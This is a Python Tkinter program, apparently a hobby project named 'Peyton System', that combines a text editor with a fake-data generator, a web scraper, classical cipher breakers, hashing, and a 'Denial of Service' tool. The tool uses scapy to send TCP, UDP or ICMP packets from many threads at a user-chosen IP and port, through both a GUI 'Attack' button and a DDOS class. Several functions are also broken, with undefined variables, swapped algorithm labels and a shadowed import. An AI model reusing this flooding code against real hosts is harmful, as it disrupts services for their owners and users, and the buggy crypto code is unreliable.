
from faker import Faker
import requests
from bs4 import BeautifulSoup as Sp
import os
import re
from cryptography.fernet import Fernet as fern
import hashlib
from threading import Thread
import socket
import hmac
import base64
from scapy.all import *
from tkinter import *
import tkinter.filedialog
import tkinter.messagebox
root = Tk()
root.geometry('350x350')
PROGRAM_NAME = 'Peyton System'
root.title(PROGRAM_NAME)

file_name = None

# show pop-up menu


def show_popup_menu(event):
    popup_menu.tk_popup(event.x_root, event.y_root)


def show_cursor_info_bar():
    show_cursor_info_checked = show_cursor_info.get()
    if show_cursor_info_checked:
        cursor_info_bar.pack(expand='no', fill=None, side='right', anchor='se')
    else:
        cursor_info_bar.pack_forget()


def update_cursor_info_bar(event=None):
    row, col = content_text.index(INSERT).split('.')
    line_num, col_num = str(int(row)), str(int(col) + 1)  # col starts at 0
    infotext = "Line: {0} | Column: {1}".format(line_num, col_num)
    cursor_info_bar.config(text=infotext)


def change_theme(event=None):
    selected_theme = theme_choice.get()
    fg_bg_colors = color_schemes.get(selected_theme)
    foreground_color, background_color = fg_bg_colors.split('.')
    content_text.config(
        background=background_color, fg=foreground_color)


def update_line_numbers(event=None):
    line_numbers = get_line_numbers()
    line_number_bar.config(state='normal')
    line_number_bar.delete('1.0', 'end')
    line_number_bar.insert('1.0', line_numbers)
    line_number_bar.config(state='disabled')


def highlight_line(interval=100):
    content_text.tag_remove("active_line", 1.0, "end")
    content_text.tag_add(
        "active_line", "insert linestart", "insert lineend+1c")
    content_text.after(interval, toggle_highlight)


def undo_highlight():
    content_text.tag_remove("active_line", 1.0, "end")


def toggle_highlight(event=None):
    if to_highlight_line.get():
        highlight_line()
    else:
        undo_highlight()


def on_content_changed(event=None):
    update_line_numbers()
    update_cursor_info_bar()


def get_line_numbers():
    output = ''
    if show_line_number.get():
        row, col = content_text.index("end").split('.')
        for i in range(1, int(row)):
            output += str(i) + '\n'
    return output


def display_about_messagebox(event=None):
    tkinter.messagebox.showinfo(
        "About", "{}{}".format(PROGRAM_NAME, "\n Peyton system designed for multipurpose functions"))


def display_help_messagebox(event=None):
    tkinter.messagebox.showinfo(
        "Help", "Help Book: \nBasics of Python Programming will really help here",
        icon='question')


def exit_editor(event=None):
    if tkinter.messagebox.askokcancel("Quit?", "Really quit?"):
        root.destroy()


def new_file(event=None):
    root.title("Untitled")
    global file_name
    file_name = None
    content_text.delete(1.0, END)
    on_content_changed()


def open_file(event=None):
    input_file_name = tkinter.filedialog.askopenfilename(defaultextension=".txt",
                                                         filetypes=[("All Files", "*.*"), ("Text Documents", "*.txt")])
    if input_file_name:
        global file_name
        file_name = input_file_name
        root.title('{} - {}'.format(os.path.basename(file_name), PROGRAM_NAME))
        content_text.delete(1.0, END)
        with open(file_name) as _file:
            content_text.insert(1.0, _file.read())
        on_content_changed()


def write_to_file(file_name):
    try:
        content = content_text.get(1.0, 'end')
        with open(file_name, 'w') as the_file:
            the_file.write(content)
    except IOError:
        tkinter.messagebox.showwarning("Save", "Could not save the file.")


def save_as(event=None):
    input_file_name = tkinter.filedialog.asksaveasfilename(defaultextension=".txt",
                                                           filetypes=[("All Files", "*.*"), ("Text Documents", "*.txt")])
    if input_file_name:
        global file_name
        file_name = input_file_name
        write_to_file(file_name)
        root.title('{} - {}'.format(os.path.basename(file_name), PROGRAM_NAME))
    return "break"


def save(event=None):
    global file_name
    if not file_name:
        save_as()
    else:
        write_to_file(file_name)
    return "break"


def select_all(event=None):
    content_text.tag_add('sel', '1.0', 'end')
    return "break"


def find_text(event=None):
    search_toplevel = Toplevel(root)
    search_toplevel.title('Find Text')
    search_toplevel.transient(root)

    Label(search_toplevel, text="Find All:").grid(row=0, column=0, sticky='e')

    search_entry_widget = Entry(
        search_toplevel, width=25)
    search_entry_widget.grid(row=0, column=1, padx=2, pady=2, sticky='we')
    search_entry_widget.focus_set()
    ignore_case_value = IntVar()
    Checkbutton(search_toplevel, text='Ignore Case', variable=ignore_case_value).grid(
        row=1, column=1, sticky='e', padx=2, pady=2)
    Button(search_toplevel, text="Find All", underline=0,
           command=lambda: search_output(
               search_entry_widget.get(), ignore_case_value.get(),
               content_text, search_toplevel, search_entry_widget)
           ).grid(row=0, column=2, sticky='e' + 'w', padx=2, pady=2)

    def close_search_window():
        content_text.tag_remove('match', '1.0', END)
        search_toplevel.destroy()
    search_toplevel.protocol('WM_DELETE_WINDOW', close_search_window)
    return "break"

def search_output(needle, if_ignore_case, content_text,
                  search_toplevel, search_box):
    content_text.tag_remove('match', '1.0', END)
    matches_found = 0
    if needle:
        start_pos = '1.0'
        while True:
            start_pos = content_text.search(needle, start_pos,
                                            nocase=if_ignore_case, stopindex=END)
            if not start_pos:
                break
            end_pos = '{}+{}c'.format(start_pos, len(needle))
            content_text.tag_add('match', start_pos, end_pos)
            matches_found += 1
            start_pos = end_pos
        content_text.tag_config(
            'match', foreground='red', background='yellow')
    search_box.focus_set()
    search_toplevel.title('{} matches found'.format(matches_found))

def fake(event=None):
    fake_toplevel = Toplevel(root)
    fake_toplevel.title('Generate fake data')
    fake_toplevel.transient(root)

    Label(fake_toplevel, text="Choose Lang:[(0)Eng(1)Ita(2)Heb(3)Jap]: ").grid(row=0, column=0, sticky='e')

    fake_entry_widget = Entry(
        fake_toplevel, width=25)
    fake_entry_widget.grid(row=0, column=1, padx=2, pady=2, sticky='we')
    fake_entry_widget.focus_set()
    Button(fake_toplevel, text="Generate data", underline=0,
           command=lambda: generate_fake(
               fake_entry_widget.get())
           ).grid(row=0, column=2, sticky='e' + 'w', padx=2, pady=2)

    def close_fake_window():
            fake_toplevel.destroy()
            fake_toplevel.protocol('WM_DELETE_WINDOW', close_fake_window)
            return "break"
def generate_fake(lang):
    languages = ['en_US', 'it_IT', 'he_IL', 'ja_JP']
    if lang:
        if int(lang) < len(languages):
            pass
        else:
            raise ValueError('Selection out of range')
            exit()
    else:
        lang = '0'
    faker = Faker(languages[int(lang)])
    name = faker.name()
    address = faker.address()
    phone_number = faker.phone_number()
    content_text.insert(1.0, f'\n++BEGINNING++\nFull name: {name}\nAddress: {address}\nPhone Number: {phone_number}\n ++END++')

def web(event=None):
    web_toplevel = Toplevel(root)
    web_toplevel.title('Web scraper')
    web_toplevel.transient(root)

    Label(web_toplevel, text="URL: ").grid(row=0, column=0, sticky='e')

    web_entry_widget = Entry(
        web_toplevel, width=25)
    web_entry_widget.grid(row=0, column=1, padx=2, pady=2, sticky='we')
    web_entry_widget.focus_set()
    Button(web_toplevel, text="Scrap", underline=0,
           command=lambda: scrap(
               web_entry_widget.get())
           ).grid(row=0, column=3, sticky='e' + 'w', padx=2, pady=2)

    def close_web_window():
            web_toplevel.destroy()
            web_toplevel.protocol('WM_DELETE_WINDOW', close_web_window)
            return "break"
def scrap(url):
   
    header = {'User-Agent', "Mozilla/20.0"}
    request = requests.get(url)
    cont = Sp(request.content, 'html.parser')
    con = (cont.prettify)
    source = con
    content_text.insert(1.0, f'\n The webpage source code: \n{source}')


def caesar(event=None):
    caesar_toplevel = Toplevel(root)
    caesar_toplevel.title('Caesar Breaker')
    caesar_toplevel.transient(root)

    Label(caesar_toplevel, text="Encrypted: ").grid(row=0, column=0, sticky='e')

    caesar_entry_widget = Entry(
        caesar_toplevel, width=25)
    caesar_entry_widget.grid(row=0, column=1, padx=2, pady=2, sticky='we')
    caesar_entry_widget.focus_set()
    Button(caesar_toplevel, text="Decipher", underline=0,
           command=lambda: breakcaesar(
               caesar_entry_widget.get())
           ).grid(row=5, column=5, sticky='e' + 'w', padx=2, pady=2)

    def close_caesar_window():
            caesar_toplevel.destroy()
            caesar_toplevel.protocol('WM_DELETE_WINDOW', close_caesar_window)
            return "break"
def breakcaesar(text):
    alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    ciphered = text.upper()
    for index in range(0, 27):
        hacked = ''
        for literal in ciphered:
            if literal in alphabet:
                key = alphabet.find(literal)
                key = key - index
                if key < 0:
                    key = key + len(alphabet)
                hacked = hacked + alphabet[key]
            else:
                hacked = hacked + literal
        content_text.insert(1.0, f'Key {index}, Text: {hacked}\n')



def vigenere(event=None):
    vigenere_toplevel = Toplevel(root)
    vigenere_toplevel.title('Vigenere Breaker')
    vigenere_toplevel.transient(root)

    Label(vigenere_toplevel, text="Encrypted: ").grid(row=0, column=0, sticky='e')
    Label(vigenere_toplevel, text="Shift string: ").grid(row=1, column=0, sticky='e')

    vigenere_entry_widget = Entry(
        vigenere_toplevel, width=25)
    vigenere_entry_widget.grid(row=0, column=1, padx=2, pady=2, sticky='we')
    vigenere_shift_entry_widget = Entry(
        vigenere_toplevel, width=25)
    vigenere_shift_entry_widget.grid(row=1, column=1, padx=2, pady=2, sticky='we')
    vigenere_entry_widget.focus_set()
    Button(vigenere_toplevel, text="Decipher", underline=0,
           command=lambda: breakvigenere(
               vigenere_entry_widget.get(), vigenere_shift_entry_widget.get())
           ).grid(row=5, column=5, sticky='e' + 'w', padx=2, pady=2)

    def close_vigenere_window():
            vigenere_toplevel.destroy()
            vigenere_toplevel.protocol('WM_DELETE_WINDOW', close_vigenere_window)
            return "break"
def breakvigenere(text, shift):
    key_2 = list(shift)
    encoded = text
    if len(encoded) == len(key_2):
        key = key
    else:
        for a in range(len(encoded) - len(key_2)):
            key_2.append(key_2[a % len(shift)])
            shift = ("".join(key_2))
    broken = []
    for i in range(len(encoded)):
        example = (ord(encoded[i]) - ord(key_2[i]) + 26) % 26
        example += ord(key_2[0])
        broken.append(chr(example))
    content_text.insert(1.0, ("".join(broken)))



def ddos(event=None):
    ddos_toplevel = Toplevel(root)
    ddos_toplevel.title('Denial of Service')
    ddos_toplevel.transient(root)

    Label(ddos_toplevel, text="Destination IP Address: ").grid(row=0, column=0, sticky='e')
    Label(ddos_toplevel, text="Destination Port: ").grid(row=1, column=0, sticky='e')
    Label(ddos_toplevel, text="Threads: ").grid(row=2, column=0, sticky='e')
    Label(ddos_toplevel, text="Message [(0)TCP(1)UDP(2)ICMP]: ").grid(row=3, column=0, sticky='e')
    Label(ddos_toplevel, text="Frequency of threads: ").grid(row=4, column=0, sticky='e')

    ddos_entry_widget = Entry(
        ddos_toplevel, width=25)
    ddos_entry_widget.grid(row=0, column=1, padx=2, pady=2, sticky='we')
    ddos_port_widget = Entry(
        ddos_toplevel, width=25)
    ddos_port_widget.grid(row=1, column=1, padx=2, pady=2, sticky='we')
    ddos_threads_widget = Entry(
        ddos_toplevel, width=25)
    ddos_threads_widget.grid(row=2, column=1, padx=2, pady=2, sticky='we')
    ddos_message_widget = Entry(
        ddos_toplevel, width=25)
    ddos_message_widget.grid(row=3, column=1, padx=2, pady=2, sticky='we')
    ddos_freq_widget = Entry(
        ddos_toplevel, width=25)
    ddos_freq_widget.grid(row=4, column=1, padx=2, pady=2, sticky='we')
    ddos_entry_widget.focus_set()
    Button(ddos_toplevel, text="Attack", underline=0,
           command=lambda: threader(
               ddos_entry_widget.get(), ddos_port_widget.get(),
               ddos_threads_widget.get(), ddos_message_widget.get(), ddos_freq_widget.get())
           ).grid(row=5, column=5, sticky='e' + 'w', padx=2, pady=2)

    def close_ddos_window():
            ddos_toplevel.destroy()
            ddos_toplevel.protocol('WM_DELETE_WINDOW', close_ddos_window)
            return "break"
def attack(ip_addr, port, threads, message):
    if message == '0':
        msg = TCP(sport = 5000, dport = int(port))
    elif message == '1':
        msg = UDP(sport = 5000, dport = int(port))
    elif message == '2':
        msg = ICMP()
    elif message == None and message != 0 and message != 1 and message != 22:
        e = 'Message not defined.....'
        content_text.insert(1.0, e)
    source_ip = socket.gethostbyname(socket.gethostname())
    ip = IP(src = source_ip, dst = ip_addr)
    packet = ip / msg
    s = send(packet, inter = 0.001)
    
    return 
def threader(ip_addr, port, threads, message,freq):
    for i in range (int(freq)  + 1):
        for a in range (int(threads) + 1):
            thr = Thread(target = attack, args = [ip_addr, port, threads, message])
            thr.start()
            content_text.insert(1.0, f'Packets sent by thread{thr} \n') 
    return print(thr)
 

def sha256(event=None):
    sha256_toplevel = Toplevel(root)
    sha256_toplevel.title('SHA-256')
    sha256_toplevel.transient(root)

    Label(sha256_toplevel, text="input: ").grid(row=0, column=0, sticky='e')

    sha256_entry_widget = Entry(
        sha256_toplevel, width=25)
    sha256_entry_widget.grid(row=0, column=1, padx=2, pady=2, sticky='we')
    sha256_entry_widget.focus_set()
    Button(sha256_toplevel, text="Generate Hash", underline=0,
           command=lambda: sha_256(
               sha256_entry_widget.get())
           ).grid(row=5, column=5, sticky='e' + 'w', padx=2, pady=2)

    def close_sha256_window():
            sha256_toplevel.destroy()
            sha256_toplevel.protocol('WM_DELETE_WINDOW', close_sha256_window)
            return "break"
def sha_256(text):
    if text == None:
        f = 'string cannot be empty'
        raise ValueError(e)
        content_text.insert(1.0, f)
    else:
         output = hashlib.sha256(bytes(text, 'utf-8'))
         output_2 = output.hexdigest()
         result = output_2

         content_text.insert(1.0, f'The hash produced is: {output_2}\n')
def fernet(event=None):
    fernet_toplevel = Toplevel(root)
    fernet_toplevel.title('Fernet')
    fernet_toplevel.transient(root)

    Label(fernet_toplevel, text="input string: ").grid(row=0, column=0, sticky='e')

    fernet_entry_widget = Entry(
        fernet_toplevel, width=25)
    fernet_entry_widget.grid(row=0, column=1, padx=2, pady=2, sticky='we')
    fernet_entry_widget.focus_set()
    Button(fernet_toplevel, text="Generate Hash", underline=0,
           command=lambda: sha_256(
               fernet_entry_widget.get())
           ).grid(row=5, column=5, sticky='e' + 'w', padx=2, pady=2)

    def close_fernet_window():
            fernet_toplevel.destroy()
            fernet_toplevel.protocol('WM_DELETE_WINDOW', close_fernet_window)
            return "break"
def fern(text):
    if string == None:
        f = 'string cannot be empty'
        raise ValueError(e)
        content_text.insert(1.0, f)
    else:
        key = fern.generate_key()
        f = fern(key)
        token = f.encrypt(bytes(string, 'utf-8'))
        result = token.hexdigest()
        content_text.insert(1.0, f'The hash produced is :{result}\n')


def cut():
    content_text.event_generate("<<Cut>>")
    on_content_changed()
    return "break"


def copy():
    content_text.event_generate("<<Copy>>")
    return "break"


def paste():
    content_text.event_generate("<<Paste>>")
    on_content_changed()
    return "break"


def undo():
    content_text.event_generate("<<Undo>>")
    on_content_changed()
    return "break"


def redo(event=None):
    content_text.event_generate("<<Redo>>")
    on_content_changed()
    return 'break'

new_file_icon = PhotoImage(file='icons/icons/new_file.gif')
open_file_icon = PhotoImage(file='icons/icons/open_file.gif')
save_file_icon = PhotoImage(file='icons/icons/save.gif')
cut_icon = PhotoImage(file='icons/icons/cut.gif')
copy_icon = PhotoImage(file='icons/icons/copy.gif')
paste_icon = PhotoImage(file='icons/icons/paste.gif')
undo_icon = PhotoImage(file='icons/icons/undo.gif')
redo_icon = PhotoImage(file='icons/icons/redo.gif')

menu_bar = Menu(root)


mmenu = Menu(menu_bar, tearoff = 0)
mmenu.add_command(label = 'Faker',
                    compound = 'left', command = fake )
mmenu.add_command(label = 'Web scraper',
                    compound = 'left', command = web )
algo_menu = Menu(menu_bar, tearoff = 0)
mmenu.add_cascade(label = 'Ciphers', menu = algo_menu)
algorithms = [caesar, vigenere]
cipher_choice = IntVar()
for i in (algorithms):
    algo_menu.add_command(
        label = str(i), compound = 'left', command = i)
hash_menu = Menu(menu_bar, tearoff = 0)
mmenu.add_cascade(label = 'Hashes', menu = hash_menu)
has_h = [sha256, fernet]
hash_choice = IntVar()
for j in has_h:
    hash_menu.add_command(
        label = str(j), compound = 'left', command = j)
mmenu.add_command(label = 'DDOS',
                    compound = 'left', command = ddos)
menu_bar.add_cascade(label = 'Main Menu', menu = mmenu)



file_menu = Menu(menu_bar, tearoff=0)
file_menu.add_command(label='New', accelerator='Ctrl+N', compound='left',
                      image=new_file_icon, underline=0, command=new_file)
file_menu.add_command(label='Open', accelerator='Ctrl+O', compound='left',
                      image=open_file_icon, underline=0, command=open_file)
file_menu.add_command(label='Save', accelerator='Ctrl+S',
                      compound='left', image=save_file_icon, underline=0, command=save)
file_menu.add_command(
    label='Save as', accelerator='Shift+Ctrl+S', command=save_as)
file_menu.add_separator()
file_menu.add_command(label='Exit', accelerator='Alt+F4', command=exit_editor)
menu_bar.add_cascade(label='File', menu=file_menu)

edit_menu = Menu(menu_bar, tearoff=0)
edit_menu.add_command(label='Undo', accelerator='Ctrl+Z',
                      compound='left', image=undo_icon, command=undo)
edit_menu.add_command(label='Redo', accelerator='Ctrl+Y',
                      compound='left', image=redo_icon, command=redo)
edit_menu.add_separator()
edit_menu.add_command(label='Cut', accelerator='Ctrl+X',
                      compound='left', image=cut_icon, command=cut)
edit_menu.add_command(label='Copy', accelerator='Ctrl+C',
                      compound='left', image=copy_icon, command=copy)
edit_menu.add_command(label='Paste', accelerator='Ctrl+V',
                      compound='left', image=paste_icon, command=paste)
edit_menu.add_separator()
edit_menu.add_command(label='Find', underline=0,
                      accelerator='Ctrl+F', command=find_text)
edit_menu.add_separator()
edit_menu.add_command(label='Select All', underline=7,
                      accelerator='Ctrl+A', command=select_all)
menu_bar.add_cascade(label='Edit', menu=edit_menu)


view_menu = Menu(menu_bar, tearoff=0)
show_line_number = IntVar()
show_line_number.set(1)
view_menu.add_checkbutton(label='Show Line Number', variable=show_line_number,
                          command=update_line_numbers)
show_cursor_info = IntVar()
show_cursor_info.set(1)
view_menu.add_checkbutton(
    label='Show Cursor Location at Bottom', variable=show_cursor_info, command=show_cursor_info_bar)
to_highlight_line = BooleanVar()
view_menu.add_checkbutton(label='Highlight Current Line', onvalue=1,
                          offvalue=0, variable=to_highlight_line, command=toggle_highlight)
themes_menu = Menu(menu_bar, tearoff=0)
view_menu.add_cascade(label='Themes', menu=themes_menu)

color_schemes = {
    'Default': '#000000.#FFFFFF',
    'Greygarious': '#83406A.#D1D4D1',
    'Aquamarine': '#5B8340.#D1E7E0',
    'Bold Beige': '#4B4620.#FFF0E1',
    'Cobalt Blue': '#ffffBB.#3333aa',
    'Olive Green': '#D1E7E0.#5B8340',
    'Night Mode': '#FFFFFF.#000000',
}

theme_choice = StringVar()
theme_choice.set('Default')
for k in sorted(color_schemes):
    themes_menu.add_radiobutton(
        label=k, variable=theme_choice, command=change_theme)
menu_bar.add_cascade(label='View', menu=view_menu)

about_menu = Menu(menu_bar, tearoff=0)
about_menu.add_command(label='About', command=display_about_messagebox)
about_menu.add_command(label='Help', command=display_help_messagebox)
menu_bar.add_cascade(label='About',  menu=about_menu)
root.config(menu=menu_bar)

shortcut_bar = Frame(root,  height=25)
shortcut_bar.pack(expand='no', fill='x')

icons = ('new_file', 'open_file', 'save', 'cut', 'copy', 'paste',
         'undo', 'redo', 'find_text')
for i, icon in enumerate(icons):
    tool_bar_icon = PhotoImage(file='icons/icons/{}.gif'.format(icon))
    cmd = eval(icon)
    tool_bar = Button(shortcut_bar, image=tool_bar_icon, command=cmd)
    tool_bar.image = tool_bar_icon
    tool_bar.pack(side='left')

line_number_bar = Text(root, width=4, padx=3, takefocus=0,  border=0,
                       background='khaki', state='disabled',  wrap='none')
line_number_bar.pack(side='left',  fill='y')

content_text = Text(root, wrap='word', undo=1)
content_text.pack(expand='yes', fill='both')
scroll_bar = Scrollbar(content_text)
content_text.configure(yscrollcommand=scroll_bar.set)
scroll_bar.config(command=content_text.yview)
scroll_bar.pack(side='right', fill='y')
cursor_info_bar = Label(content_text, text='Line: 1 | Column: 1')
cursor_info_bar.pack(expand='no', fill=None, side='right', anchor='se')


content_text.bind('<KeyPress-F1>', display_help_messagebox)
content_text.bind('<Control-N>', new_file)
content_text.bind('<Control-n>', new_file)
content_text.bind('<Control-O>', open_file)
content_text.bind('<Control-o>', open_file)
content_text.bind('<Control-S>', save)
content_text.bind('<Control-s>', save)
content_text.bind('<Control-f>', find_text)
content_text.bind('<Control-F>', find_text)
content_text.bind('<Control-A>', select_all)
content_text.bind('<Control-a>', select_all)
content_text.bind('<Control-y>', redo)
content_text.bind('<Control-Y>', redo)
content_text.bind('<Any-KeyPress>', on_content_changed)
content_text.tag_configure('active_line', background='ivory2')

# set up the pop-up menu
popup_menu = Menu(content_text)
for i in ('cut', 'copy', 'paste', 'undo', 'redo'):
    cmd = eval(i)
    popup_menu.add_command(label=i, compound='left', command=cmd)
popup_menu.add_separator()
popup_menu.add_command(label='Select All', underline=7, command=select_all)
content_text.bind('<Button-3>', show_popup_menu)


# bind right mouse click to show pop up and set focus to text widget on launch
content_text.bind('<Button-3>', show_popup_menu)
content_text.focus_set()



class Fk():
    def __init__(self):
        val = input('Please choose your preferred language [0. English 1.Italian 2.Hebrew 3.Japanese] ')
        languages = ['en_US', 'it_IT', 'he_IL', 'ja_JP']
        if val:
            if int(val) < len(languages):
                pass
            else:
                raise ValueError('Selection out of range')
                exit()
        else:
            val = '0'
        faker = Faker(languages[int(val)])
        self.name = faker.name()
        self.address = faker.address()
        self.phone_number = faker.phone_number()
    def __repr__(self):
        return f'Full name: {self.name}\nAddress: {self.address}\nPhone Number: {self.phone_number}'

class Website():
    def __init__(self):
        url = input('Enter full URL here: ')
        keyword = input('Enter search keyword here: ')
        header = {'User-Agent', "Mozilla/20.0"}
        request = requests.get(url)
        cont = Sp(request.content, 'html5lib')
        con = (cont.prettify)
        source = con
        search_content = cont.find(string=re.compile(keyword))
        self.source = source
        self.search_content = search_content
    def __repr__(self):
        return f'\n The webpage source code: \n{self.source}'
        return f'\n instances of the keyword are: \n {self.search_content}'
class crypto():
    def __init__(self):
        string = input('Enter your plain text to encrypt: ')
        algor = input('Select preferred algorithm [1.SHA-256 2.Fernet]')
        string = bytes(string, 'utf-8')
        if algor and string != None:
            pass
        elif algor == None:
            e = 'No Selection taken. Exiting.....'
            raise Exception(e)
            exit()
        elif string == None:
            f = 'string cannot be empty'
            raise ValueError(e)
            exit()
        if algor == '1':
            key = fern.generate_key()
            f = fern(key)
            token = f.encrypt(string)
            result = token
        elif algor == '2':
             output = hashlib.sha256(string)
             output_2 = output.digest()
             result = output_2
        elif algor != '1' or algor != '2':
            exception = 'Exception occured.. exiting...'
            raise ValueError(exception)
            exit()
        self.result = result
    def __repr__(self):
        return f' \n Output of encryption is:\n {self.result}'

class cipherbreaker():
    def __init__(self):
        ciphered = input('Enter ciphered text: ')
        alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        ciphered = ciphered.upper()
        for index in range(len(ciphered)):
            hacked = ''
            for literal in ciphered:
                if literal in alphabet:
                    key = alphabet.find(literal)
                    key = key - index
                    if key < 0:
                        key = key + len(alphabet)
                    hacked = hacked + alphabet[key]
                else:
                    hacked = hacked + literal
            self.hacked = hacked
            self.index = index
            print(f'Key {self.index}, Text: {self.hacked}')

class vigenerebreak():
    def __init__(self):
        encoded = input('Enter the encoded string: ')
        key = input('Enter the key of encoding: ')
        key_2 = list(key)
        if len(encoded) == len(key_2):
            key = key
        else:
            for a in range(len(encoded) - len(key_2)):
                key_2.append(key_2[a % len(key)])
                key = ("".join(key_2))
        broken = []
        for i in range(len(encoded)):
            example = (ord(encoded[i]) - ord(key_2[i]) + 26) % 26
            example += ord(key_2[0])
            broken.append(chr(example))
        self.broken = broken
        print("".join(broken))


class DDOS:
    def __init__(self, ip_addr, port, threads, message, freq):
        self.ip_addr = ip_addr
        self.port = port
        self.threads = threads
        self.message = message
        self.freq = freq
    def attack(self):
        now = datetime.now()
        if self.message == '0':
            msg = TCP(sport = 5000, dport = int(self.port))
        elif self.message == '1':
            msg = UDP(sport = 5000, dport = int(self.port))
        elif self.message == '2':
            msg = ICMP()
        elif self.message == None and self.message != 0 and self.message != 1 and self.message != 22:
            e = 'message not defined..Exiting....'
            raise Exception(e)
            exit()
        source_ip = socket.gethostbyname(socket.gethostname())
        ip = IP(src = source_ip, dst = self.ip_addr)
        packet = ip / msg
        s = send(packet, inter = 0.001)
        return 
    def threader(self):
        for i in range (int(self.freq)  + 1):
            for a in range (int(self.threads) + 1):
                thr = Thread(target = self.attack)
                thr.start()
                



"""print(Fk())
print(Website())
print(crypto())
print(cipherbreaker())"""
"""print(vigenerebreak())"""

def denial():
    ip_addr = input('Enter the IP Address of the target: ')
    port = input('Enter the port number: ')
    threads = input('Enter the number of threads to run: ')
    message = input('Select message to be sent [0. TCP, 1.UDP, 2.ICMP]: ')
    freq = input('Enter number of times the threads should run: ')
    d = DDOS(ip_addr, port, threads, message, freq)
    return d
    denial().threader()
if __name__ == '__main__':
    root.mainloop()